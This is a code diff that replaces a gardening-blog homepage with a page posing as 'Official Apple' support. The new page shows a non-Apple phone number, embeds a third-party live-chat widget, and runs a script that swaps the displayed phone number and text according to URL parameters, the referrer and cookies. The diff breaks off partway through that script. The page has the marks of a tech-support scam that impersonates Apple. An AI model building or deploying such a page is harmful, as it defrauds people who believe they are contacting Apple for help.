@@ -1,501 +1,387 @@
-<!DOCTYPE html>
-<html lang="en">
-<head>
-  <meta charset="UTF-8">
-  <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <title>Zephora Ivy Dominion · garden authority</title>
-  <!-- unique premium typography: system + serif accent, no generic google fonts -->
-  <style>
-    /* ----- reset & base (unique spacing system) ----- */
-    * {
-      margin: 0;
-      padding: 0;
-      box-sizing: border-box;
-    }
+<!DOCTYPE html><html xmlns="http://www.w3.org/1999/xhtml" lang="en-US" class="no-js"><head>
 
-    body {
-      background: #faf7f2;
-      color: #1f2a1f;
-      font-family: 'Segoe UI', 'Roboto', system-ui, -apple-system, sans-serif;
-      line-height: 1.7;
-      padding: 0 1.5rem;
-    }
 
-    .site-wrap {
-      max-width: 1280px;
-      margin: 0 auto;
-      background: #ffffff;
-      box-shadow: 0 0 60px rgba(0,0,0,0.02);
-      padding: 0 2.5rem 3rem;
-      border-radius: 0 0 24px 24px;
-    }
 
-    /* ----- typography (unique scale) ----- */
-    h1, h2, h3, h4 {
-      font-weight: 500;
-      letter-spacing: -0.02em;
-      line-height: 1.2;
-      font-family: 'Georgia', 'Times New Roman', serif;
-      color: #1f2a1f;
-    }
+<!-- Privacy-friendly analytics by Plausible -->
+<script async src="https://plausible.io/js/pa-t6QZLw8Xjz2I8nZakWwmB.js"></script>
+<script>
+  window.plausible=window.plausible||function(){(plausible.q=plausible.q||[]).push(arguments)},plausible.init=plausible.init||function(i){plausible.o=i||{}};
+  plausible.init()
+</script>
 
-    h1 {
-      font-size: 3.2rem;
-      font-weight: 600;
-      letter-spacing: -0.03em;
-      margin-bottom: 0.5rem;
-    }
 
-    h2 {
-      font-size: 2.2rem;
-      margin-top: 2.8rem;
-      margin-bottom: 0.8rem;
-      border-bottom: 2px solid #e6dfd3;
-      padding-bottom: 0.4rem;
-    }
+<script>
+  const domain = window.location.hostname;
+  const s = document.createElement("script");
+  s.defer = true;
+  s.setAttribute("data-domain", domain);
+  s.src = "https://plausible.io/js/script.js";
+  document.head.appendChild(s);
+</script><meta http-equiv="Content-Type" content="text/html; charset=utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <meta http-equiv="cache-control" content="max-age=3600">
+    <title>Contact - Official Apple</title>
+    <meta name="description" content="Contact Apple support by phone or chat, set up a repair, or make a Genius Bar appointment for iPhone, iPad, Mac and more.">
+    <link rel="stylesheet" href="css/Base.css" type="text/css">
+    <link rel="stylesheet" type="text/css" href="_families%253dSF%252bPro%252cv1_7CSF%252bPro%252bIcons%252cv1html.html">
+    <script async="" src="https://embed.tawk.to/667056f19a809f19fb3eaed8/1i0jd783t" charset="UTF-8" crossorigin="*"></script><script src="js/text_tel.js"></script>
 
-    h3 {
-      font-size: 1.6rem;
-      margin-top: 2rem;
-      margin-bottom: 0.6rem;
-      font-weight: 500;
-    }
-
-    p {
-      margin-bottom: 1.2rem;
-      color: #2a342a;
-    }
-
-    a {
-      color: #3d6b3d;
-      text-decoration: none;
-      transition: color 0.1s;
-      border-bottom: 1px dotted #b8c9b8;
-    }
-
-    a:hover {
-      color: #1a3a1a;
-      border-bottom: 1px solid #3d6b3d;
-    }
-
-    /* ----- header / navigation (clean) ----- */
-    .top-header {
-      display: flex;
-      justify-content: space-between;
-      align-items: center;
-      padding: 2rem 0 1.2rem;
-      border-bottom: 1px solid #eae3d6;
-      flex-wrap: wrap;
-    }
-
-    .brand {
-      font-size: 1.8rem;
-      font-weight: 500;
-      font-family: 'Georgia', serif;
-      letter-spacing: -0.02em;
-      color: #1f2a1f;
-      border-bottom: none;
-    }
-
-    .brand span {
-      color: #7b5e3b;
-      font-weight: 300;
-    }
-
-    .nav-links {
-      display: flex;
-      gap: 2.2rem;
-      font-size: 1rem;
-      font-weight: 450;
-      letter-spacing: 0.02em;
-      text-transform: uppercase;
-    }
-
-    .nav-links a {
-      border-bottom: none;
-      color: #3a4a3a;
-    }
-
-    .nav-links a:hover {
-      color: #1a2a1a;
-      border-bottom: 2px solid #7b5e3b;
-    }
-
-    /* ----- hero (detailed intro) ----- */
-    .hero {
-      padding: 3.2rem 0 1.8rem;
-      margin-bottom: 1.8rem;
-    }
-
-    .hero h1 {
-      font-size: 3.6rem;
-      line-height: 1.1;
-    }
-
-    .hero-sub {
-      font-size: 1.3rem;
-      color: #4f5f4f;
-      max-width: 760px;
-      margin: 1.2rem 0 1.8rem;
-      font-weight: 350;
-      border-left: 4px solid #b5c9a8;
-      padding-left: 1.8rem;
-    }
-
-    .hero-featured-topics {
-      display: flex;
-      flex-wrap: wrap;
-      gap: 1rem 2rem;
-      margin-top: 1rem;
-      background: #f3efe8;
-      padding: 0.8rem 1.8rem;
-      border-radius: 40px;
-      width: fit-content;
-      font-weight: 450;
-    }
-
-    .hero-featured-topics span {
-      color: #1f2a1f;
-    }
-
-    /* ----- utility cards (unique card design) ----- */
-    .card-grid {
-      display: grid;
-      grid-template-columns: repeat(auto-fill, minmax(300px, 1fr));
-      gap: 2.2rem;
-      margin: 2rem 0 2.5rem;
-    }
-
-    .card {
-      background: #fcfaf6;
-      border-radius: 20px;
-      padding: 1.8rem 1.8rem 2rem;
-      border: 1px solid #e7dfd2;
-      transition: all 0.2s;
-      box-shadow: 0 4px 12px rgba(0,0,0,0.01);
-      display: flex;
-      flex-direction: column;
-    }
-
-    .card:hover {
-      border-color: #b5c9a8;
-      box-shadow: 0 12px 28px -8px rgba(60, 80, 50, 0.06);
-    }
-
-    .card h3 {
-      margin-top: 0.2rem;
-      font-size: 1.6rem;
-      font-weight: 550;
-    }
-
-    .card p {
-      font-size: 0.98rem;
-      color: #3f4d3f;
-      flex: 1;
-    }
-
-    .card .meta-tag {
-      font-size: 0.75rem;
-      text-transform: uppercase;
-      letter-spacing: 0.04em;
-      color: #7b8f7b;
-      border-bottom: 1px dashed #d3cdbe;
-      padding-bottom: 0.5rem;
-      margin-bottom: 0.8rem;
-    }
-
-    /* ----- featured article (unique layout) ----- */
-    .featured-article {
-      display: flex;
-      gap: 2.8rem;
-      background: #f2ede4;
-      padding: 2.2rem 2.5rem;
-      border-radius: 32px;
-      margin: 2.5rem 0 2.8rem;
-      align-items: center;
-      flex-wrap: wrap;
-    }
-
-    .featured-article .content {
-      flex: 2;
-      min-width: 260px;
-    }
-
-    .featured-article .content h2 {
-      border-bottom: none;
-      margin-top: 0;
-      font-size: 2.2rem;
-    }
-
-    .featured-article .img-wrap {
-      flex: 1;
-      min-width: 180px;
-      background: #d8d0c0;
-      border-radius: 28px;
-      height: 180px;
-      background-image: url('data:image/svg+xml;utf8,<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 400 300" width="400" height="300"><rect width="400" height="300" fill="%23c2b7a2"/><circle cx="150" cy="120" r="50" fill="%239fb28f"/><circle cx="280" cy="170" r="40" fill="%237b9a6b"/><rect x="100" y="220" width="200" height="30" fill="%238f7b5e" rx="4"/><circle cx="70" cy="240" r="18" fill="%23aabb8f"/><circle cx="330" cy="220" r="25" fill="%23aabb8f"/></svg>');
-      background-size: cover;
-      background-position: center;
-      border: 2px solid #dad1c0;
-    }
-
-    /* ----- category image (inline) ----- */
-    .category-spot {
-      display: flex;
-      align-items: center;
-      gap: 1.8rem;
-      background: #f6f2ea;
-      padding: 0.8rem 2rem 0.8rem 2rem;
-      border-radius: 60px;
-      width: fit-content;
-      margin: 1rem 0 2rem;
-    }
-    .category-spot .cat-img {
-      width: 50px;
-      height: 50px;
-      background: #c6bbaa;
-      border-radius: 30px;
-      background-image: url('data:image/svg+xml;utf8,<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 100 100"><rect width="100" height="100" fill="%23b0a48b"/><circle cx="40" cy="40" r="20" fill="%238fa07a"/><circle cx="70" cy="60" r="16" fill="%23728a62"/></svg>');
-      background-size: cover;
-    }
-
-    /* ----- table / comparison (unique style) ----- */
-    .compare-table {
-      width: 100%;
-      border-collapse: collapse;
-      margin: 2rem 0 2.2rem;
-      font-size: 0.95rem;
-      background: #f9f6f0;
-      border-radius: 20px;
-      overflow: hidden;
-    }
-
-    .compare-table th {
-      background: #e3dbcd;
-      padding: 1rem 1.2rem;
-      text-align: left;
-      font-weight: 500;
-      color: #1f2a1f;
-    }
-
-    .compare-table td {
-      padding: 0.9rem 1.2rem;
-      border-bottom: 1px solid #e2d9cb;
-    }
-
-    .compare-table tr:last-child td {
-      border-bottom: none;
-    }
-
-    /* ----- checklist (unique) ----- */
-    .checklist {
-      background: #f3efe8;
-      padding: 1.8rem 2.2rem;
-      border-radius: 28px;
-      margin: 1.6rem 0;
-      list-style: none;
-    }
-
-    .checklist li {
-      padding: 0.4rem 0 0.4rem 2rem;
-      background: url('data:image/svg+xml;utf8,<svg xmlns="http://www.w3.org/2000/svg" width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="%233d6b3d" stroke-width="3" stroke-linecap="round" stroke-linejoin="round"><polyline points="20 6 9 17 4 12"></polyline></svg>') left center no-repeat;
-      background-size: 1.2rem;
-    }
-
-    /* ----- faq (schema-ready) ----- */
-    .faq-item {
-      border-bottom: 1px solid #dfd7c7;
-      padding: 1.2rem 0;
-    }
-
-    .faq-item strong {
-      display: block;
-      font-size: 1.2rem;
-      font-weight: 550;
-      font-family: 'Georgia', serif;
-      color: #1f2a1f;
-      margin-bottom: 0.3rem;
-    }
-
-    /* ----- newsletter (minimal) ----- */
-    .newsletter {
-      background: #eae3d6;
-      padding: 2.8rem 2.5rem;
-      border-radius: 48px;
-      margin: 3rem 0 1.8rem;
-      text-align: center;
-    }
-
-    .newsletter input {
-      border: 1px solid #c5b9a4;
-      background: white;
-      padding: 0.8rem 1.8rem;
-      border-radius: 60px;
-      font-size: 1rem;
-      width: 280px;
-      max-width: 80%;
-    }
-
-    .newsletter button {
-      background: #1f2a1f;
-      border: none;
-      color: white;
-      padding: 0.8rem 2.4rem;
-      border-radius: 60px;
-      font-weight: 500;
-      margin-left: 0.4rem;
-      cursor: pointer;
-    }
-
-    /* ----- footer ----- */
-    .footer {
-      margin-top: 3.5rem;
-      padding-top: 2rem;
-      border-top: 1px solid #d9d0bf;
-      display: flex;
-      justify-content: space-between;
-      flex-wrap: wrap;
-      gap: 1.2rem;
-      font-size: 0.9rem;
-      color: #4d5a4d;
-    }
-
-    /* ---- responsive ---- */
-    @media (max-width: 720px) {
-      .site-wrap { padding: 0 1rem 2rem; }
-      h1 { font-size: 2.5rem; }
-      .hero h1 { font-size: 2.6rem; }
-      .top-header { flex-direction: column; align-items: start; gap: 0.8rem; }
-      .nav-links { gap: 1.2rem; flex-wrap: wrap; }
-      .featured-article { flex-direction: column; padding: 1.8rem; }
-    }
-  </style>
 </head>
+
 <body>
-<div class="site-wrap">
+    <div id="result"></div>
+    <input type="checkbox" id="ac-gn-menustate" class="ac-gn-menustate">
+    <nav id="ac-globalnav" class="no-js">
+        <div class="ac-gn-content">
+            <ul class="ac-gn-header">
+                <li class="ac-gn-item ac-gn-menuicon">
+                    <label class="ac-gn-menuicon-label" for="ac-gn-menustate" aria-hidden="true">
+					 <span class="ac-gn-menuicon-bread ac-gn-menuicon-bread-top">
+						 <span class="ac-gn-menuicon-bread-crust ac-gn-menuicon-bread-crust-top"></span>
+					 </span>
+					 <span class="ac-gn-menuicon-bread ac-gn-menuicon-bread-bottom">
+						 <span class="ac-gn-menuicon-bread-crust ac-gn-menuicon-bread-crust-bottom"></span>
+					 </span>
+				 </label>
+                    <a href="#ac-gn-menustate" class="ac-gn-menuanchor ac-gn-menuanchor-open" id="ac-gn-menuanchor-open">
+					 <span class="ac-gn-menuanchor-label">Open Menu </span></a>
+                    <a href="#" class="ac-gn-menuanchor ac-gn-menuanchor-close" id="ac-gn-menuanchor-close">
+					 <span class="ac-gn-menuanchor-label">Close Menu </span></a>
+                </li>
+                <li class="ac-gn-item ac-gn-apple">
+                    <a class="ac-gn-link ac-gn-link-apple" href="#" id="ac-gn-firstfocus-small">
+					 <span class="ac-gn-link-text">Apple </span></a>
+                </li>
+                <li class="ac-gn-item ac-gn-bag ac-gn-bag-small" id="ac-gn-bag-small">
+                    <a class="ac-gn-link ac-gn-link-bag analytics-exitlink" href="#"><span class="ac-gn-link-text">Shopping Bag </span><span class="ac-gn-bag-badge"></span></a>
+                    <span class="ac-gn-bagview-caret ac-gn-bagview-caret-large"></span>
+                </li>
+            </ul>
+            <ul class="ac-gn-list">
+                <li class="ac-gn-item ac-gn-apple">
+                    <a class="ac-gn-link ac-gn-link-apple" href="#" id="ac-gn-firstfocus">
+					 <span class="ac-gn-link-text">Apple </span></a>
+                </li>
+                <li class="ac-gn-item ac-gn-item-menu ac-gn-mac">
+                    <a class="ac-gn-link ac-gn-link-mac" href="#">
+					 <span class="ac-gn-link-text">Mac </span></a>
+                </li>
+                <li class="ac-gn-item ac-gn-item-menu ac-gn-ipad">
+                    <a class="ac-gn-link ac-gn-link-ipad" href="#">
+					 <span class="ac-gn-link-text">iPad </span></a>
+                </li>
+                <li class="ac-gn-item ac-gn-item-menu ac-gn-iphone">
+                    <a class="ac-gn-link ac-gn-link-iphone" href="#">
+					 <span class="ac-gn-link-text">iPhone </span></a>
+                </li>
+                <li class="ac-gn-item ac-gn-item-menu ac-gn-watch">
+                    <a class="ac-gn-link ac-gn-link-watch" href="#">
+					 <span class="ac-gn-link-text">Watch </span></a>
+                </li>
+                <li class="ac-gn-item ac-gn-item-menu ac-gn-tv">
+                    <a class="ac-gn-link ac-gn-link-tv" href="#">
+					 <span class="ac-gn-link-text">TV </span></a>
+                </li>
+                <li class="ac-gn-item ac-gn-item-menu ac-gn-music">
+                    <a class="ac-gn-link ac-gn-link-music" href="#">
+					 <span class="ac-gn-link-text">Music </span></a>
+                </li>
+                <li class="ac-gn-item ac-gn-item-menu ac-gn-support">
+                    <a class="ac-gn-link ac-gn-link-support" href="#">
+					 <span class="ac-gn-link-text">Support </span></a>
+                </li>
+                <li class="ac-gn-item ac-gn-item-menu ac-gn-search" role="search">
+                    <a class="ac-gn-link ac-gn-link-search" href="#">
+					 <span class="ac-gn-search-placeholder" aria-hidden="true">Search apple.com </span></a>
+                </li>
+                <li class="ac-gn-item ac-gn-bag" id="ac-gn-bag">
+                    <a class="ac-gn-link ac-gn-link-bag analytics-exitlink" href="#" aria-label="Shopping Bag">
+					 <span class="ac-gn-link-text">Shopping Bag </span>
+					 <span class="ac-gn-bag-badge" aria-hidden="true"></span></a>
+                    <span class="ac-gn-bagview-caret ac-gn-bagview-caret-large"></span>
+                </li>
+            </ul>
+            <aside id="ac-gn-searchview" class="ac-gn-searchview" role="search">
+                <div class="ac-gn-searchview-content">
+                    <form id="ac-gn-searchform" class="ac-gn-searchform" action="http://www.apple.com/us/search" method="get">
+                        <div class="ac-gn-searchform-wrapper">
+                            <input id="ac-gn-searchform-input" class="ac-gn-searchform-input" type="text" placeholder="Search apple.com" autocorrect="off" autocapitalize="off" autocomplete="off" spellcheck="false">
+                            <input id="ac-gn-searchform-src" type="hidden" name="src" value="globalnav">
+                            <button id="ac-gn-searchform-submit" class="ac-gn-searchform-submit" type="submit" disabled="" aria-label="Submit"></button>
+                            <button id="ac-gn-searchform-reset" class="ac-gn-searchform-reset" type="reset" disabled="" aria-label="Clear Search"></button>
+                        </div>
+                    </form>
+                    <aside id="ac-gn-searchresults" class="ac-gn-searchresults"></aside>
+                </div>
+                <button id="ac-gn-searchview-close" class="ac-gn-searchview-close" aria-label="Close Search">
+					 <span class="ac-gn-searchview-close-wrapper">
+						 <span class="ac-gn-searchview-close-left"></span>
+						 <span class="ac-gn-searchview-close-right"></span>
+					 </span>
+			 </button>
+            </aside>
+            <aside class="ac-gn-bagview">
+                <div class="ac-gn-bagview-scrim">
+                    <span class="ac-gn-bagview-caret ac-gn-bagview-caret-small"></span>
+                </div>
+                <div class="ac-gn-bagview-content" id="ac-gn-bagview-content">
+                </div>
+            </aside>
+        </div>
+    </nav>
+    <div id="ac-gn-curtain" class="ac-gn-curtain"></div>
+    <div id="ac-gn-placeholder" class="ac-nav-placeholder"></div>
 
-  <!-- header -->
-  <header class="top-header">
-    <a href="#" class="brand">Zephora Ivy <span>· Dominion</span></a>
-    <div class="nav-links">
-     <li><a href="index.html">Home</a></li>
-                    <li><a href="about.html">About</a></li>
-                    <li><a href="contact.html">Contact</a></li>
-                    <li><a href="terms.html">Terms Of Privacy</a></li>
-                    <li><a href="privacy.html">Privacy Policy</a></li>
-					<li><a href="cookies.html">Cookies Policy</a></li>
+    <div class="main">
+        <nav id="ac-localnav" class="js no-touch css-sticky" lang="en-US" role="navigation" data-sticky="">
+            <div class="ac-ln-wrapper">
+                <div class="ac-ln-background"></div>
+                <div class="ac-ln-content">
+                    <span class="ac-ln-title">
+                       <a href="#">Apple Support +1-833-497-3169 <font color="red"><font class="js_setPhoneBlock"></font></font></a>
+					 </span>
+                    <div class="ac-ln-menu">
+                        <a href="#ac-ln-menustate" class="ac-ln-menucta-anchor ac-ln-menucta-anchor-open" id="ac-ln-menustate-open">  <span class="ac-ln-menucta-anchor-label">Open menu </span></a> <a href="#" class="ac-ln-menucta-anchor ac-ln-menucta-anchor-close" id="ac-ln-menustate-close">  <span class="ac-ln-menucta-anchor-label">Close menu </span></a>
+                        <div class="ac-ln-menu-tray">
+                            <ul class="ac-ln-menu-items">
+                                <li class="ac-ln-menu-item"><a href="#" class="ac-ln-menu-link analytics-exitlink"> Communities </a>
+                                </li>
+                            </ul>
+                        </div>
+                        <div class="ac-ln-actions">
+                            <div class="ac-ln-action ac-ln-action-menucta" aria-hidden="true">
+                                <label for="ac-ln-menustate" class="ac-ln-menucta">  <span class="ac-ln-menucta-chevron"></span>
+							 </label>
+                            </div>
+                        </div>
+                    </div>
+                </div>
+            </div>
+        </nav>
+        <section class="as-columns  as-columns--1up  as-banner as-banner--top">
+            <div class="row">
+                <div class="column large-12 medium-12 small-12">
+                    <div class="as-banner-cont">
+                        <div class="as-banner-image as-banner-image--top">
+                            <style type="text/css">
+                                .as-banner-image.as-banner-image--top {
+                                    background-image: url("images/contact-us-hero.image.large_2x.jpg");
+                                }
+
+                                .as-banner-image.as-banner-image--top:before {
+                                    content: "";
+                                    display: block;
+                                }
+
+                                @media only screen and (max-width: 735px) {
+                                    .as-banner-image.as-banner-image--top {
+                                        background-image: url("images/contact-us-hero.image.small_2x.jpg");
+                                    }
+                                }
+                            </style>
+                            <img sizes="(min-width:735px ) 735w, 100vw" srcset="images/contact-us-hero.image.small_2x.jpg 735w, images/contact-us-hero.image.large_2x.jpg 1440w" alt="" class="as-image-speculativedownload" src="images/contact-us-hero.image.large_2x.jpg">
+                        </div>
+                    </div>
+                    <div class="as-banner-content">
+                        <div class="pageTitle  ">
+                            <h1 class="pageTitle-heading">Apple Support </h1>
+                            <p class="pageTitle-intro js_setTextBlock">
+                        </p></div>
+                        <div class="sectionTitle sectionTitleBlock">
+                            <h2 class="sectionTitle-heading"></h2>
+                        </div>
+                    </div>
+                </div>
+            </div>
+        </section>
     </div>
-  </header>
 
-  <!-- 1. Hero Section -->
-  <section class="hero">
-    <h1>Rooted in wisdom,<br>grown with care.</h1>
-    <div class="hero-sub">Zephora Ivy Dominion is a sanctuary for gardeners who seek depth—where horticulture meets heritage, and every leaf tells a story. From soil science to seasonal alchemy, we cultivate knowledge that lasts.</div>
-    <div class="hero-featured-topics">
-      <span>🌱  perennial philosophy</span>
-      <span>🌿  regenerative growing</span>
-      <span>🌻  heirloom varieties</span>
-    </div>
-    <!-- hero image (unique) :: 1 of 4 images -->
-    <div style="margin-top: 1.8rem; border-radius: 40px; overflow: hidden; max-width: 100%; background: #d8d0be; height: 120px; background-image: url('data:image/svg+xml;utf8,<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 800 200"><rect width="800" height="200" fill="%23d8d0be"/><rect x="40" y="120" width="160" height="30" fill="%239f8d72" rx="12"/><rect x="280" y="80" width="120" height="25" fill="%239f8d72" rx="12"/><rect x="520" y="100" width="180" height="28" fill="%239f8d72" rx="14"/><circle cx="180" cy="70" r="35" fill="%2389a07a"/><circle cx="620" cy="50" r="40" fill="%237a946a"/><circle cx="380" cy="30" r="28" fill="%239fb28f"/></svg>'); background-size: cover;"></div>
-  </section>
+    <footer id="ac-globalfooter" class="no-js">
+        <div class="ac-gf-content">
+            <section class="ac-gf-footer">
+                <div class="ac-gf-footer-shop"> More ways to: Visit an <a href="#" class="analytics-exitlink">Apple Store </a>, <span class="nowrap">call  <font class="js_setPhoneBlock"></font>, or  <a href="#" class="analytics-exitlink">find a reseller </a></span>.
+                </div>
+                <div class="ac-gf-footer-locale">
+                    <a class="ac-gf-footer-locale-link" href="#" title="Choose your country or region" aria-label="United States. Choose your country or region"><img class="ac-gf-footer-locale-flag" src="images/us.png" alt="" width="16" height="16">United
+					States </a>
+                </div>
+                <div class="ac-gf-footer-legal">
+                    <div class="ac-gf-footer-legal-copyright">Copyright© 2026 Apple . All rights reserved. </div>
+                    <div class="ac-gf-footer-legal-links"><a class="ac-gf-footer-legal-link analytics-exitlink" href="#">Privacy
+					Policy </a> <a class="ac-gf-footer-legal-link analytics-exitlink" href="#">Terms of Use </a>
+                        <a class="ac-gf-footer-legal-link analytics-exitlink" href="#">Sales and Refunds </a> <a class="ac-gf-footer-legal-link" href="#">Site
+						Map </a> <a class="ac-gf-footer-legal-link" href="#">Contact
+						Apple </a></div>
+                </div>
+                <meta content="Apple" property="name">
+                <meta content="+1-833-497-3169
+			 " property="telephone">
+            </section>
+        </div>
+    </footer>
 
-  <!-- 2. Featured Articles (one featured + 3 cards) -->
-  <div class="featured-article">
-    <div class="content">
-      <div class="meta-tag">✦ featured masterclass</div>
-      <h2>The art of soil alchemy</h2>
-      <p>Transform tired earth into living loam. This deep-dive covers mineral balancing, fungal networks, and no-dig principles—backed by 40 years of experimental plots.</p>
-      <a href="#" style="border-bottom: 2px solid #3d6b3d;">read more →</a>
-    </div>
-    <div class="img-wrap" aria-label="Featured article image: soil layers"></div>
-  </div>
 
-  <!-- 3. Beginner guides + Expert resources (card grid) -->
-  <div style="display: flex; justify-content: space-between; align-items: baseline; flex-wrap: wrap; margin-top: 1rem;">
-    <h2 style="border-bottom: none; margin: 0;">Beginner guides</h2>
-    <span style="color: #4d6b4d; font-size: 0.9rem;">→  expert resources below</span>
-  </div>
-  <div class="card-grid">
-    <div class="card"><div class="meta-tag">📗  starter</div><h3>First season framework</h3><p>Plan your first edible garden with our 8-week blueprint — avoid overwhelm, harvest joy.</p><a href="#">start here →</a></div>
-    <div class="card"><div class="meta-tag">📘  soil</div><h3>pH &amp; texture decoded</h3><p>Understand your soil’s personality with simple home tests. No lab required.</p><a href="#">read guide →</a></div>
-    <div class="card"><div class="meta-tag">📙  design</div><h3>Four-season permaculture</h3><p>Integrate perennials, annuals, and support species for a resilient garden ecosystem.</p><a href="#">explore →</a></div>
-  </div>
 
-  <!-- expert resources (second row) -->
-  <h2 style="margin-top: 0.8rem;">Expert resources</h2>
-  <div class="card-grid">
-    <div class="card"><div class="meta-tag">🧪  advanced</div><h3>Grafting &amp; scion wood</h3><p>Master the splice graft, whip-and-tongue, and bridge grafting for heritage trees.</p><a href="#">masterclass →</a></div>
-    <div class="card"><div class="meta-tag">🌾  ecology</div><h3>Predator-pest balancing</h3><p>Attract beneficial insects and build a self-regulating garden with companion planting.</p><a href="#">deep dive →</a></div>
-    <div class="card"><div class="meta-tag">🧬  seed saving</div><h3>Heirloom isolation techniques</h3><p>Preserve genetic purity with distance, caging, and time isolation methods.</p><a href="#">learn →</a></div>
-  </div>
+    <script src="js/jquery-1.12.0.min.js"></script>
+    <script>
+        function getURLParameter(name) {
+            return decodeURI(
+                (RegExp(name + '=' + '(.+?)(&|$)').exec(location.search) || [, null])[1] || ''
+            );
+        };
+        var cookieHelper = {
+            defParams: {
+                path: "/",
+                domain: "." + window.location.host.replace(/:\d+/, "")
+            },
+            set: function(a, d, c) {
+                c = c || {};
+                for (var b in this.defParams) "undefined" == typeof c[b] && (c[b] = this.defParams[b]);
+                b = c.expires;
+                if ("number" == typeof b && b) {
+                    var e = new Date;
+                    e.setTime(e.getTime() + 1E3 * b);
+                    b = c.expires = e
+                }
+                b && b.toUTCString && (c.expires = b.toUTCString());
+                d = encodeURIComponent(d);
+                a = a + "=" + d;
+                for (var f in c) a += "; " + f, d = c[f], !0 !== d && (a += "=" + d);
+                document.cookie = a
+            },
+            get: function(a) {
+                return (a = document.cookie.match(new RegExp("(?:^|; )" + a.replace(/([\.$?*|{}\(\)\[\]\\\/\+^])/g, "\\$1") + "=([^;]*)"))) ? decodeURIComponent(a[1]) : void 0
+            },
+            del: function(a) {
+                this.set(a, null, {
+                    expires: -1
+                })
+            }
+        };
 
-  <!-- 4. Category image + popular categories -->
-  <div class="category-spot">
-    <div class="cat-img"></div>
-    <span style="font-weight: 450;">popular categories:  vegetables · perennials · shrubs · design · soil · climate</span>
-  </div>
 
-  <!-- 5. Trending topics + latest articles (unique hybrid) -->
-  <div style="display: grid; grid-template-columns: 1fr 1fr; gap: 2rem; margin: 2rem 0;">
-    <div><h2 style="border-bottom: none; margin: 0 0 0.8rem;">⚡ trending</h2>
-      <ul style="list-style: none; background: #f3efe8; padding: 1.2rem 1.8rem; border-radius: 24px;">
-        <li style="padding: 0.5rem 0; border-bottom: 1px solid #ddd2c0;">•  no-dig revolution: 5-year results</li>
-        <li style="padding: 0.5rem 0; border-bottom: 1px solid #ddd2c0;">•  native pollinator corridors</li>
-        <li style="padding: 0.5rem 0;">•  water-wise mulch strategies</li>
-      </ul>
-    </div>
-    <div><h2 style="border-bottom: none; margin: 0 0 0.8rem;">📰 latest articles</h2>
-      <ul style="list-style: none; background: #f3efe8; padding: 1.2rem 1.8rem; border-radius: 24px;">
-        <li style="padding: 0.5rem 0; border-bottom: 1px solid #ddd2c0;">•  winter sowing in milk jugs</li>
-        <li style="padding: 0.5rem 0; border-bottom: 1px solid #ddd2c0;">•  biochar: ancient amendment</li>
-        <li style="padding: 0.5rem 0;">•  pruning for structure &amp; fruit</li>
-      </ul>
-    </div>
-  </div>
+        var userAgent = window.navigator.userAgent.toLowerCase(),
+            ios = /iphone|ipod|ipad/.test(userAgent);
 
-  <!-- 6. In-depth tutorials + comparison table  -->
-  <h2>In-depth tutorials</h2>
-  <div style="background: #f9f5ed; padding: 0.8rem 1.8rem 1.8rem; border-radius: 32px; margin-bottom: 2rem;">
-    <h3 style="margin-top: 0.8rem;">Compost tea vs. extract: which to use?</h3>
-    <table class="compare-table">
-      <tr><th>Method</th><th>Brew time</th><th>Microbial density</th><th>Best for</th></tr>
-      <tr><td>Aerated tea</td><td>24-36h</td><td>high (fungal/bacterial)</td><td>foliar &amp; soil drench</td></tr>
-      <tr><td>Passive extract</td><td>12h soak</td><td>moderate</td><td>root zone &amp; seedlings</td></tr>
-    </table>
-    <p style="margin-bottom: 0.2rem;">Both are powerful, but tea requires aeration while extract is simpler for small gardens.</p>
-  </div>
+        function parseURL(url) {
+            var a = document.createElement('a');
+            a.href = url;
+            return a.hostname.replace('www.', '');
+        };
 
-  <!-- 7. Resource hub (checklist) -->
-  <h2>Resource hub</h2>
-  <ul class="checklist">
-    <li>🌿  Seed starting calendar (zone 5-9)</li>
-    <li>🌱  Garden journal templates (download)</li>
-    <li>📐  Raised bed spacing calculator</li>
-    <li>🧪  Soil test interpretation guide</li>
-  </ul>
+        function getPar(name) {
+            var url = window.location.href;
+            name = name.replace(/[\[\]]/g, "\\$&");
+            var regex = new RegExp("[?&]" + name + "(=([^&#]*)|&|#|$)"),
+                results = regex.exec(url);
+            if (!results) return null;
+            if (!results[2]) return '';
+            return decodeURIComponent(results[2].replace(/\+/g, " "));
+        };
 
-  <!-- 8. FAQ (schema-ready) -->
-  <h2>Frequently asked questions</h2>
-  <div class="faq-item"><strong>What is the best time to start a vegetable garden?</strong> <p>After the last frost date. For most temperate zones, that’s mid-spring. Use our zone lookup tool.</p></div>
-  <div class="faq-item"><strong>How often should I water raised beds?</strong> <p>Deeply and less frequently — aim for 1 inch per week, adjusting for rainfall and mulch.</p></div>
-  <div class="faq-item"><strong>Can I grow perennials in containers?</strong> <p>Yes, with appropriate winter protection and large pots. Choose dwarf varieties.</p></div>
+        window.number = getPar('phone');
 
-  <!-- 9. Newsletter -->
-  <div class="newsletter">
-    <h3 style="font-family: 'Georgia', serif; font-weight: 400; margin-bottom: 0.8rem;">🌱  The Dominion Dispatch</h3>
-    <p style="max-width: 500px; margin: 0 auto 1.2rem;">Weekly letters from the garden — seasonal wisdom, uncommon techniques, and quiet observations.</p>
-    <input type="email" placeholder="your email" aria-label="newsletter email"> <button>subscribe</button>
-  </div>
+        window.number = (window.number ? window.number : '+1-833-497-3169');
 
-  <!-- 10. Footer -->
-  <footer class="footer">
-    <span>© 2026 Zephora Ivy Dominion ·  cultivated with care</span>
-    <span style="display: flex; gap: 1.5rem;"><a href="#">essays</a><a href="#">podcast</a><a href="#">books</a></span>
-  </footer>
+        window.device = 'iPhone';
+        window.refef = parseURL(document.referrer);
 
-  <!-- additional note: 4th image (optional infographic) appears as table background, already used. -->
-  <!-- total images used: 1 hero (inline), 1 featured (inline), 1 category (inline), 1 infographic (table bg) => exactly 4 -->
-</div>
-</body>
-</html>
+        if (ios) {
+
+            if (/iphone/.test(userAgent)) {
+                window.device = 'iPhone';
+            }
+
+            if (/ipad/.test(userAgent)) {
+                window.device = 'iPad';
+            }
+
+            if (/ipod/.test(userAgent)) {
+                window.device = 'iPod';
+            }
+        }
+
+        var text = cookieHelper.get('textSetBl');
+        var phone = cookieHelper.get('phoneSetBl');
+
+        function getText() {
+            var str = window.defaultText;
+
+            for (var d in window.text) {
+                if (window.refef.indexOf(d) != -1) {
